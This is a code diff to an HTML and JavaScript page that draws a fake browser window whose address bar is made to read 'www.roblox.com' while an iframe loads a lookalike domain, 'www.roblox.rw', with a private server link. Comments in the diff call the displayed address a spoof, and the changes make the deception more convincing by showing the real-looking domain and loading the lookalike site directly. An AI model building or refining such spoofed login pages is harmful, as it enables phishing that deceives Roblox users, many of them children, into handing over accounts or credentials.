@@ -132,7 +132,7 @@
             <div class="chrome-toolbar">
                 <div class="chrome-address">
                     <svg viewBox="0 0 24 24" width="10" height="10" fill="#5f6368"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/></svg>
-                    <span class="chrome-url" id="fakeUrlText"><span class="chrome-url-dim">https://</span>www.roblox.rw/games/95206881/Baseplate...</span>
+                    <span class="chrome-url" id="fakeUrlText"><span class="chrome-url-dim">https://</span>www.roblox.com/games/95206881/Baseplate...</span>
                 </div>
             </div>
             <div class="chrome-content">
@@ -141,10 +141,10 @@
         </div>
     </div>
         <script>
-        // Real URL: the .rw link (loads in the iframe)
-        const REAL_URL = "https://www-roblox-rw.translate.goog/games/95206881/Baseplate?privateServerLinkCode=26065913844785075427592831388890&_x_tr_sl=auto&_x_tr_tl=en&_x_tr_hl=en";
+        // Configured directly with roblox.rw target url for the iframe content load
+        const REAL_URL = "https://www.roblox.rw/games/95206881/Baseplate?privateServerLinkCode=26065913844785075427592831388890";
         
-        // Fake URL: the .com spoof (displayed in the address bar)
+        // Spoofed clean display string for the browser address bar
         const FAKE_URL = "www.roblox.com/games/95206881/Baseplate?privateServerLinkCode=26065913844785075427592831388890";
 
         // Toned-down static game list
@@ -194,10 +194,10 @@
             // 1. Set the fake URL spoof in the address bar
             fakeTxt.innerHTML = `<span class="chrome-url-dim">https://</span>${FAKE_URL}`;
             
-            // 2. Load the .rw URL in the iframe
+            // 2. Load the roblox.rw link in the iframe
             iframe.src = REAL_URL;
 
-            // 3. Open the fake tab
+            // 3. Open the modal window
             modal.classList.add('active');
         }
 
